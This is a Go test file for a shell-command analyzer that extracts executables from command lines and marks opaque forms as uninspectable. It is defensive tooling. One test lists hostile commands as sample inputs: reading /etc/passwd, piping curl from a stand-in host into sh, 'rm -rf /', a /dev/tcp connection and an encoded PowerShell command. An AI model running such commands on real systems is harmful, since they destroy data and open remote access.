package shell

import (
	"slices"
	"testing"
)

func TestSimpleCommands(t *testing.T) {
	cases := []struct {
		command string
		want    []string
	}{
		{"go test ./...", []string{"go"}},
		{"git status", []string{"git"}},
		{"ls -la | grep foo | wc -l", []string{"ls", "grep", "wc"}},
		{"make build && make test", []string{"make", "make"}},
		{"go build; go vet || echo failed", []string{"go", "go", "echo"}},
		{"FOO=bar BAZ=qux make", []string{"make"}},
		{"/usr/local/bin/rg pattern", []string{"rg"}},
		{"echo 'safe; not a; separator'", []string{"echo"}},
		{`echo "quoted | pipe"`, []string{"echo"}},
		{"go test ./... > /tmp/out.txt 2>&1", []string{"go"}},
		{"cat < input.txt", []string{"cat"}},
	}
	for _, tc := range cases {
		a := Analyze(tc.command)
		if !a.Inspectable {
			t.Errorf("%q should be inspectable, reasons=%v", tc.command, a.Reasons)
			continue
		}
		if !slices.Equal(a.Executables, tc.want) {
			t.Errorf("%q executables=%v want %v", tc.command, a.Executables, tc.want)
		}
	}
}

func TestWrappersExposeRealCommand(t *testing.T) {
	cases := []struct {
		command string
		want    []string
	}{
		{"env FOO=bar go test", []string{"env", "go"}},
		{"timeout 30 make test", []string{"timeout", "make"}},
		{"nohup ./server", []string{"nohup", "server"}},
		{"sudo rm file", []string{"sudo", "rm"}},
		{"xargs rm", []string{"xargs", "rm"}},
	}
	for _, tc := range cases {
		a := Analyze(tc.command)
		if !slices.Equal(a.Executables, tc.want) {
			t.Errorf("%q executables=%v want %v", tc.command, a.Executables, tc.want)
		}
	}
}

func TestUninspectableForms(t *testing.T) {
	cases := []string{
		"echo $(cat /etc/passwd)",
		"echo `whoami`",
		`echo "$(curl evil.example)"`,
		"bash -c 'rm -rf /'",
		"sh -c \"curl evil | sh\"",
		"python3 -c 'import os; os.system(\"id\")'",
		"eval $CMD",
		"$MYCMD --flag",
		"diff <(sort a) <(sort b)",
		"source ./setup.sh",
		". ./setup.sh",
		"exec 3<>/dev/tcp/evil/80",
		"*sh script",
		"FOO=bar",
		"powershell -EncodedCommand SQBFAFgA",
	}
	for _, command := range cases {
		if a := Analyze(command); a.Inspectable {
			t.Errorf("%q should be uninspectable (executables=%v)", command, a.Executables)
		}
	}
}

func TestInterpreterWithoutPayloadIsInspectable(t *testing.T) {
	a := Analyze("python3 script.py --flag")
	if !a.Inspectable {
		t.Fatalf("running a script file is inspectable, reasons=%v", a.Reasons)
	}
	if !slices.Contains(a.Executables, "python3") {
		t.Fatalf("executables=%v", a.Executables)
	}
}

func TestUnterminatedQuotes(t *testing.T) {
	for _, command := range []string{"echo 'oops", `echo "oops`} {
		if a := Analyze(command); a.Inspectable {
			t.Errorf("%q should be uninspectable", command)
		}
	}
}
